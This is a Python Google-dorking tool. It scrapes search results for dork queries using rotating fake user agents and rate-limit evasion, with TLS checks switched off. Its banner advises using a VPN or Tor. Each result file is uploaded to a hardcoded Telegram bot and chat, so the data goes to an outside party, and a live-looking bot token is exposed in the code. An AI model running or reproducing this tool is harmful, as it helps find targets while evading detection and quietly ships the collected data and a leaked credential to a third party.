import os
import requests
from bs4 import BeautifulSoup
import urllib.parse
import random
import time
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Suppress only the InsecureRequestWarning from urllib3
warnings.simplefilter('ignore', InsecureRequestWarning)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.3 Safari/602.3.12"
]

TELEGRAM_TOKEN = "7676886801:AAHv61olZ9lITCYLPW1IOQBkkLf9TRLGFiU"
CHAT_ID = "-1002279798801"

def send_telegram_document(file_path):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
    with open(file_path, 'rb') as file:
        response = requests.post(url, data={"chat_id": CHAT_ID}, files={"document": file})
    if response.status_code == 200:
        print(Fore.GREEN + "Document sent successfully.")
    else:
        print(Fore.RED + f"Failed to send document. Status code: {response.status_code}")

def google_search_dork(query, num_pages=15, min_delay=60, max_delay=120):
    results = []
    safe_dork_name = urllib.parse.quote_plus(query)
    file_name = f"{safe_dork_name}.txt"
    
    for page in range(num_pages):
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        start = page * 10
        search_url = f"https://www.google.com/search?q={urllib.parse.quote(query)}&start={start}"

        try:
            response = requests.get(search_url, headers=headers, timeout=30, verify=False)
            if response.status_code == 429:
                print(Fore.YELLOW + "Too Many Requests. Waiting before retrying...")
                time.sleep(random.uniform(min_delay, max_delay))
                continue
            elif response.status_code != 200:
                print(Fore.RED + f"Failed to fetch Google results on page {page + 1}. Status code: {response.status_code}")
                continue

            soup = BeautifulSoup(response.text, 'html.parser')
            page_results = []
            for link in soup.select('a[href^=\"http\"]'):
                url = link.get('href')
                if 'google.com' not in url and url.startswith("http"):
                    clean_url = url.split("&")[0]
                    page_results.append(clean_url)
                    results.append(clean_url)

            print(Fore.CYAN + f"Fetched {len(page_results)} results from page {page + 1}.")
            
            with open(file_name, 'a') as f:
                for result in page_results:
                    f.write(result + "\n")

        except Exception as e:
            print(Fore.RED + f"Error on page {page + 1}: {e}")

        time.sleep(random.uniform(min_delay, max_delay))

    return results

def remove_line_from_file(file_name, line_to_remove):
    with open(file_name, "r") as f:
        lines = f.readlines()
    with open(file_name, "w") as f:
        for line in lines:
            if line.strip("\n") != line_to_remove:
                f.write(line)
                
def display_menu():
    os.system('clear')
    logo = r"""
 ___ _____   __________ ____   ___    _   _ _____ ____   ___  
|_ _|_   _| |__  / ____|  _ \ / _ \  | | | | ____|  _ \ / _ \ 
 | |  | |     / /|  _| | |_) | | | | | |_| |  _| | |_) | | | |
 | |  | |    / /_| |___|  _ <| |_| | |  _  | |___|  _ <| |_| |
|___| |_|   /____|_____|_| \_\\___/  |_| |_|_____|_| \_\\___/ 
    """
    
    
    print(Fore.RED + logo)
    print(Fore.BLUE + "☠️☠️☠️WARNING: ANY USE IS AT YOUR OWN RISK!☠️☠️☠️")
    print(Fore.CYAN + "*" * 55)
    print(Fore.YELLOW + "* Author   : TnZeroIT")
    print(Fore.YELLOW + "* GitHub   : https://github.com/TNZEROIT")
    print(Fore.YELLOW + "* YouTube  : TNZEROIT")
    print(Fore.YELLOW + "* Telegram  : https://t.me/TNZEROIT")
    print(Fore.YELLOW + "* Instagram: TNZEROIT")
    print(Fore.GREEN + "************* USE VPN OR TOR SERVICE ********************")
    print(Fore.YELLOW + "1. USE DORK MANUALLY")
    print(Fore.YELLOW + "2. USE DORK FILE")

def main():
    display_menu()
    choice = input(Fore.CYAN + "Select option (1 or 2): ")
    min_delay = int(input(Fore.CYAN + "Enter minimum delay between requests (in seconds): "))
    max_delay = int(input(Fore.CYAN + "Enter maximum delay between requests (in seconds): "))

    if choice == '1':
        dork_query = input(Fore.CYAN + "Enter dork manually: ").strip()
        if dork_query:
            print(Fore.GREEN + f"Searching websites using Google dork: {dork_query}...")
            search_results = google_search_dork(dork_query, num_pages=15, min_delay=min_delay, max_delay=max_delay)
            send_telegram_document(f"{urllib.parse.quote_plus(dork_query)}.txt")
    elif choice == '2':
        with open('dork.txt', 'r') as file:
            dorks = file.readlines()
        
        for dork_query in dorks:
            dork_query = dork_query.strip()
            if not dork_query:
                continue
            
            print(Fore.GREEN + f"Searching websites using Google dork: {dork_query}...")
            search_results = google_search_dork(dork_query, num_pages=15, min_delay=min_delay, max_delay=max_delay)
            send_telegram_document(f"{urllib.parse.quote_plus(dork_query)}.txt")
            remove_line_from_file('dork.txt', dork_query)
            time.sleep(random.uniform(min_delay, max_delay))
    else:
        print(Fore.RED + "Invalid option. Please restart the program.")

if __name__ == "__main__":
    main()
